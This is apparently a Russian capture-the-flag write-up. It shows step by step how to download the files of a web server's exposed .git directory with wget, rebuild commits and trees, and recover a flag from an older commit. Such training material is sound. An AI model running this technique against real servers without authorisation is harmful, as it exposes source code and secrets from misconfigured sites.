**Задание:**

Чтобы найти флаг, нужно вернуться в прошлое.

Адрес: http://31.207.77.216:4003

---
**Решение:**

Попробуем загрузить отдельные файлы из `.git`:

```shell
wget http://31.207.77.216:4003/.git/HEAD
wget http://31.207.77.216:4003/.git/config
```

Содержимое `HEAD` (указателя на текущее положение):

```text
ref: refs/heads/main
```

Загрузим `main` – в нём хранится хэш последнего коммита:

```shell
wget http://31.207.77.216:4003/.git/refs/heads/main
```

Содержимое `main`:

```text
c5cdaabb713b0160c3ce40dc63465ee2d787c111
```

У нас есть хеш коммита. Восстанавливаем репозиторий:

```shell
mkdir git_recovery
cd git_recovery
git init

# Скачиваем объект коммита
mkdir -p .git/objects/c5
wget http://31.207.77.216:4003/.git/objects/c5/cdaabb713b0160c3ce40dc63465ee2d787c111 -O .git/objects/c5/cdaabb713b0160c3ce40dc63465ee2d787c111
```

Смотрим информацию о коммите:

```shell
git cat-file -p c5cdaabb713b0160c3ce40dc63465ee2d787c111

tree e33b2d3026b7760864b0d5cea9165c7eda4eae60
parent 8db3e342af6a16e689b448595e69c8fa2e865068
author Евгений Ипатов <zhenikipatov@yandex.ru> 1757234669 +0300
committer Евгений Ипатов <zhenikipatov@yandex.ru> 1757234669 +0300

The Matrix has you...
```

Имеем:

- `tree` - хеш дерева файлов;
- `parent` - хеш предыдущего коммита;
- `author` - информация об авторе.

Скачиваем родительский коммит (старый коммит):

```shell
mkdir -p .git/objects/8d
wget http://31.207.77.216:4003/.git/objects/8d/b3e342af6a16e689b448595e69c8fa2e865068 -O .git/objects/8d/b3e342af6a16e689b448595e69c8fa2e865068
```

Смотрим содержимое `tree` (содержит список файлов в коммите):

```shell
git cat-file -p 8db3e342af6a16e689b448595e69c8fa2e865068

tree 21011745f151e79cf538c3a3ef069d3911a0f366
author Евгений Ипатов <zhenikipatov@yandex.ru> 1757234645 +0300
committer Евгений Ипатов <zhenikipatov@yandex.ru> 1757234645 +0300

Flag
```

Скачиваем `tree` объекта старого коммита:

```shell
mkdir -p .git/objects/21
wget http://31.207.77.216:4003/.git/objects/21/011745f151e79cf538c3a3ef069d3911a0f366 -O .git/objects/21/011745f151e79cf538c3a3ef069d3911a0f366
```

Смотрим содержимое:

```shell
git cat-file -p 21011745f151e79cf538c3a3ef069d3911a0f366

100644 blob 9b7fc0020c351b0fc748dc44f843f272c5535bb7    index.html
```

Скачиваем `blob` (хранит файлы) объекта `index.html`:

```shell
mkdir -p .git/objects/9b
wget http://31.207.77.216:4003/.git/objects/9b/7fc0020c351b0fc748dc44f843f272c5535bb7 -O .git/objects/9b/7fc0020c351b0fc748dc44f843f272c5535bb7
```

Смотрим содержимое страницы и находим флаг:

```shell
git cat-file -p 9b7fc0020c351b0fc748dc44f843f272c5535bb7

<!DOCTYPE html>
<html lang="ru">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Страница с флагом</title>
</head>

<body>
  <h1>BugCTF{XXXXXXXXXXXXXXX}</h1>
</body> 
```